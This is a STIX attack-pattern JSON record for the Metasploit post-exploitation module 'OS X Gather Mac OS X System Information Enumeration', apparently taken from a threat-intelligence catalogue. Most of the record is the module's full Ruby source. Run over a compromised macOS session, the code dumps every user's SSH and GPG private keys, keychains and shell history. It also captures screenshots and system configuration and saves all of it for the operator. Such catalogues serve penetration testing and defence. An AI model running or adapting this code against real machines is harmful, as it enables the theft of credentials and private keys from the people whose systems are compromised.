{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4a5b30e0-ba0c-449c-9836-e10884b8f939",
    "created": "2024-08-14T16:33:00.697617Z",
    "modified": "2024-08-14T16:33:00.697621Z",
    "name": "OS X Gather Mac OS X System Information Enumeration",
    "description": " This module gathers basic system information from Mac OS X Tiger (10.4), through Mojave (10.14).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/enum_osx.rb",
            "external_id": "enum_osx.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OS X Gather Mac OS X System Information Enumeration',\n        'Description' => %q{\n          This module gathers basic system information from Mac OS X Tiger (10.4), through\n          Mojave (10.14).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ]\n      )\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    case session.type\n    when /meterpreter/\n      host = sysinfo['Computer']\n    when /shell/\n      host = cmd_exec('hostname')\n    end\n    print_status(\"Running module against #{host}\")\n    if is_root?\n      print_status('This session is running as root!')\n    end\n\n    ver_num = get_ver\n    log_folder = log_folder_create\n    enum_conf(log_folder)\n    enum_accounts(log_folder, ver_num)\n    get_crypto_keys(log_folder)\n    screenshot(log_folder, ver_num)\n    dump_bash_history(log_folder)\n    get_keychains(log_folder)\n  end\n\n  # parse the dslocal plist in lion\n  def read_ds_xml_plist(plist_content)\n    require 'rexml/document'\n\n    doc = REXML::Document.new(plist_content)\n    keys = []\n\n    doc.elements.each('plist/dict/key') do |element|\n      keys << element.text\n    end\n\n    fields = {}\n    i = 0\n    doc.elements.each('plist/dict/array') do |element|\n      data = []\n      fields[keys[i]] = data\n      element.each_element('*') do |thing|\n        data_set = thing.text\n        if data_set\n          data << data_set.gsub(\"\\n\\t\\t\", '')\n        else\n          data << data_set\n        end\n      end\n      i += 1\n    end\n    return fields\n  end\n\n  # Function for creating the folder for gathered data\n  def log_folder_create(log_path = nil)\n    # Get hostname\n    case session.type\n    when /meterpreter/\n      host = Rex::FileUtils.clean_path(sysinfo['Computer'])\n    when /shell/\n      host = Rex::FileUtils.clean_path(cmd_exec('hostname'))\n    end\n\n    # Create Filename info to be appended to downloaded files\n    file_name_info = '_' + ::Time.now.strftime('%Y%m%d.%M%S')\n\n    # Create a directory for the logs\n    if log_path\n      logs = ::File.join(log_path, 'logs', 'enum_osx', host + file_name_info)\n    else\n      logs = ::File.join(Msf::Config.log_directory, 'post', 'enum_osx', host + file_name_info)\n    end\n\n    # Create the log directory\n    ::FileUtils.mkdir_p(logs)\n    return logs\n  end\n\n  # Checks if the target is OSX Server\n  def check_server\n    # Get the OS Name\n    cmd_exec('/usr/bin/sw_vers', '-productName') =~ /Server/\n  end\n\n  # Enumerate the OS Version\n  def get_ver\n    # Get the OS Version\n    cmd_exec('/usr/bin/sw_vers', '-productVersion')\n  end\n\n  def enum_conf(log_folder)\n    profile_datatypes = {\n      'OS' => 'SPSoftwareDataType',\n      'Network' => 'SPNetworkDataType',\n      'Bluetooth' => 'SPBluetoothDataType',\n      'Ethernet' => 'SPEthernetDataType',\n      'Printers' => 'SPPrintersDataType',\n      'USB' => 'SPUSBDataType',\n      'Airport' => 'SPAirPortDataType',\n      'Firewall' => 'SPFirewallDataType',\n      'Known Networks' => 'SPNetworkLocationDataType',\n      'Applications' => 'SPApplicationsDataType',\n      'Development Tools' => 'SPDeveloperToolsDataType',\n      'Frameworks' => 'SPFrameworksDataType',\n      'Logs' => 'SPLogsDataType',\n      'Preference Panes' => 'SPPrefPaneDataType',\n      'StartUp' => 'SPStartupItemDataType'\n    }\n\n    shell_commands = {\n      'TCP Connections' => ['/usr/sbin/netstat', '-np tcp'],\n      'UDP Connections' => ['/usr/sbin/netstat', '-np udp'],\n      'Environment Variables' => ['/usr/bin/printenv', ''],\n      'Last Boottime' => ['/usr/bin/who', '-b'],\n      'Current Activity' => ['/usr/bin/who', ''],\n      'Process List' => ['/bin/ps', '-ea']\n    }\n\n    print_status(\"Saving all data to #{log_folder}\")\n\n    # Enumerate first using System Profiler\n    profile_datatypes.each do |name, profile_datatypes|\n      print_status(\"\\tEnumerating #{name}\")\n      returned_data = cmd_exec(\"/usr/sbin/system_profiler #{profile_datatypes}\")\n      # Save data lo log folder\n      file_local_write(log_folder + \"//#{name}.txt\", returned_data)\n    end\n\n    # Enumerate using system commands\n    shell_commands.each do |name, command|\n      print_status(\"\\tEnumerating #{name}\")\n      command_output = cmd_exec(command[0], command[1])\n      # Save data lo log folder\n      begin\n        file_local_write(log_folder + \"//#{name}.txt\", command_output)\n      rescue StandardError\n        print_error(\"failed to run #{name}\")\n      end\n    end\n  end\n\n  def enum_accounts(log_folder, ver_num)\n    # Specific commands for Leopard and Snow Leopard\n    leopard_commands = {\n      'Users' => ['/usr/bin/dscacheutil', '-q user'],\n      'Groups' => ['/usr/bin/dscacheutil', '-q group']\n    }\n\n    # Specific commands for Tiger\n    tiger_commands = {\n      'Users' => ['/usr/sbin/lookupd', '-q user'],\n      'Groups' => ['/usr/sbin/lookupd', '-q group']\n    }\n\n    if ver_num =~ /10\\.(7|6|5)/\n      shell_commands = leopard_commands\n    else\n      shell_commands = tiger_commands\n    end\n    shell_commands.each do |name, command|\n      print_status(\"\\tEnumerating #{name}\")\n      command_output = cmd_exec(command[0], command[1])\n      # Save data lo log folder\n      file_local_write(log_folder + \"//#{name}.txt\", command_output)\n    end\n  end\n\n  # Method for getting SSH and GPG Keys\n  def get_crypto_keys(log_folder)\n    # Run commands according to the session type\n    if session.type =~ /shell/\n\n      # Enumerate and retreave files according to privilege level\n      if !is_root?\n\n        # Enumerate the home folder content\n        home_folder_list = cmd_exec('/bin/ls -ma ~/').split(', ')\n\n        # Check for SSH folder and extract keys if found\n        if home_folder_list.include?(\"\\.ssh\")\n          print_status('.ssh Folder is present')\n          ssh_folder = cmd_exec('/bin/ls -ma ~/.ssh').split(', ')\n          ssh_folder.each do |k|\n            next if k =~ /^\\.$|^\\.\\.$/\n\n            print_status(\"\\tDownloading #{k.strip}\")\n            ssh_file_content = cmd_exec(\"/bin/cat ~/.ssh/#{k}\")\n\n            # Save data lo log folder\n            file_local_write(log_folder + \"//#{k.strip.gsub(/\\W/, '_')}\", ssh_file_content)\n          end\n        end\n\n        # Check for GPG and extract keys if found\n        if home_folder_list.include?(\"\\.gnupg\")\n          print_status('.gnupg Folder is present')\n          gnugpg_folder = cmd_exec('/bin/ls -ma ~/.gnupg').split(', ')\n          gnugpg_folder.each do |k|\n            next if k =~ /^\\.$|^\\.\\.$/\n\n            print_status(\"\\tDownloading #{k.strip}\")\n            gpg_file_content = cmd_exec(\"/bin/cat ~/.gnupg/#{k.strip}\")\n\n            # Save data lo log folder\n            file_local_write(log_folder + \"//#{k.strip.gsub(/\\W/, '_')}\", gpg_file_content)\n          end\n        end\n      else\n        users = []\n        users_folder = cmd_exec('/bin/ls', '/Users')\n        users_folder.each_line do |u|\n          next if u.chomp =~ /Shared|\\.localized/\n\n          users << u.chomp\n        end\n\n        users.each do |u|\n          user_folder = cmd_exec(\"/bin/ls -ma /Users/#{u}/\").split(', ')\n          next unless user_folder.include?(\"\\.ssh\")\n\n          print_status(\".ssh Folder is present for #{u}\")\n          ssh_folder = cmd_exec(\"/bin/ls -ma /Users/#{u}/.ssh\").split(', ')\n          ssh_folder.each do |k|\n            next if k =~ /^\\.$|^\\.\\.$/\n\n            print_status(\"\\tDownloading #{k.strip}\")\n            ssh_file_content = cmd_exec(\"/bin/cat /Users/#{u}/.ssh/#{k}\")\n\n            # Save data lo log folder\n            file_local_write(log_folder + \"//#{k.strip.gsub(/\\W/, '_')}\", ssh_file_content)\n          end\n        end\n\n        users.each do |u|\n          user_folder = cmd_exec(\"/bin/ls -ma /Users/#{u}/\").split(', ')\n          next unless user_folder.include?(\"\\.ssh\")\n\n          print_status(\".gnupg Folder is present for #{u}\")\n          ssh_folder = cmd_exec(\"/bin/ls -ma /Users/#{u}/.gnupg\").split(', ')\n          ssh_folder.each do |k|\n            next if k =~ /^\\.$|^\\.\\.$/\n\n            print_status(\"\\tDownloading #{k.strip}\")\n            ssh_file_content = cmd_exec(\"/bin/cat /Users/#{u}/.gnupg/#{k}\")\n\n            # Save data lo log folder\n            file_local_write(log_folder + \"//#{k.strip.gsub(/\\W/, '_')}\", ssh_file_content)\n          end\n        end\n      end\n    end\n  end\n\n  # Method  for capturing screenshot of targets\n  def screenshot(log_folder, ver_num)\n    if ver_num =~ /10\\.(7|6|5)/\n      print_status('Capturing screenshot')\n      picture_name = ::Time.now.strftime('%Y%m%d.%M%S')\n      if is_root?\n        print_status('Capturing screenshot for each loginwindow process since privilege is root')\n        if session.type =~ /shell/\n          loginwindow_pids = cmd_exec(\"/bin/ps aux \\| /usr/bin/awk \\'/name/ \\&\\& \\!/awk/ \\{print \\$2\\}\\'\").split(\"\\n\")\n          loginwindow_pids.each do |pid|\n            print_status(\"\\tCapturing for PID:#{pid}\")\n            cmd_exec(\"/bin/launchctl bsexec #{pid} /usr/sbin/screencapture -x /tmp/#{pid}.jpg\")\n            file_local_write(log_folder + \"//screenshot_#{pid}.jpg\",\n                             cmd_exec(\"/bin/cat /tmp/#{pid}.jpg\"))\n            cmd_exec(\"/usr/bin/srm -m -z /tmp/#{pid}.jpg\")\n          end\n        end\n      else\n        cmd_exec('/usr/sbin/screencapture', \"-x /tmp/#{picture_name}.jpg\")\n        file_local_write(log_folder + '//screenshot.jpg',\n                         cmd_exec(\"/bin/cat /tmp/#{picture_name}.jpg\"))\n        cmd_exec('/usr/bin/srm', \"-m -z /tmp/#{picture_name}.jpg\")\n      end\n      print_status('Screenshot Captured')\n    end\n  end\n\n  def dump_bash_history(log_folder)\n    print_status('Extracting history files')\n    users = []\n    users_folder = cmd_exec('/bin/ls', '/Users')\n    current_user = cmd_exec('/usr/bin/id', '-nu')\n    users_folder.each_line do |u|\n      next if u.chomp =~ /Shared|\\.localized/\n\n      users << u.chomp\n    end\n\n    # If we are root lets get root for when sudo was used and all users\n    if current_user == 'root'\n\n      # Check the root user folder\n      root_folder = cmd_exec('/bin/ls -ma ~/').split(', ')\n      root_folder.each do |f|\n        next unless f =~ /\\.\\w*_history/\n\n        print_status(\"\\tHistory file #{f.strip} found for root\")\n        print_status(\"\\tDownloading #{f.strip}\")\n        sh_file = cmd_exec(\"/bin/cat ~/#{f.strip}\")\n\n        # Save data lo log folder\n        file_local_write(log_folder + \"//root_#{f.strip}.txt\", sh_file)\n      end\n\n      # Getting the history files for all users\n      users.each do |u|\n        # Lets get a list of all the files on the users folder and place them in an array\n        user_folder = cmd_exec(\"/bin/ls -ma /Users/#{u}/\").split(', ')\n        user_folder.each do |f|\n          next unless f =~ /\\.\\w*_history/\n\n          print_status(\"\\tHistory file #{f.strip} found for #{u}\")\n          print_status(\"\\tDownloading #{f.strip}\")\n          sh_file = cmd_exec(\"/bin/cat /Users/#{u}/#{f.strip}\")\n\n          # Save data lo log folder\n          file_local_write(log_folder + \"//#{u}_#{f.strip}.txt\", sh_file)\n        end\n      end\n\n    else\n      current_user_folder = cmd_exec('/bin/ls -ma ~/').split(', ')\n      current_user_folder.each do |f|\n        next unless f =~ /\\.\\w*_history/\n\n        print_status(\"\\tHistory file #{f.strip} found for #{current_user}\")\n        print_status(\"\\tDownloading #{f.strip}\")\n        sh_file = cmd_exec(\"/bin/cat ~/#{f.strip}\")\n\n        # Save data lo log folder\n        file_local_write(log_folder + \"//#{current_user}_#{f.strip}.txt\", sh_file)\n      end\n    end\n  end\n\n  # Download configured Keychains\n  def get_keychains(log_folder)\n    users = []\n    users_folder = cmd_exec('/bin/ls', '/Users')\n    users_folder.each_line do |u|\n      next if u.chomp =~ /Shared|\\.localized/\n\n      users << u.chomp\n    end\n    if is_root?\n      users.each do |u|\n        print_status(\"Enumerating and Downloading keychains for #{u}\")\n        keychain_files = cmd_exec(\"/usr/bin/sudo -u #{u} -i /usr/bin/security list-keychains\").split(\"\\n\")\n        keychain_files.each do |k|\n          keychain_file = cmd_exec(\"/bin/cat #{k.strip}\")\n\n          # Save data lo log folder\n          file_local_write(log_folder + \"//#{u}#{k.strip.gsub(/\\W/, '_')}\", keychain_file)\n        end\n      end\n    else\n      current_user = cmd_exec('/usr/bin/id -nu')\n      print_status(\"Enumerating and Downloading keychains for #{current_user}\")\n      keychain_files = cmd_exec('/usr/bin/security list-keychains').split(\"\\n\")\n      keychain_files.each do |k|\n        keychain_file = cmd_exec(\"/bin/cat #{k.strip}\")\n\n        # Save data lo log folder\n        file_local_write(log_folder + \"//#{current_user}#{k.strip.gsub(/\\W/, '_')}\", keychain_file)\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}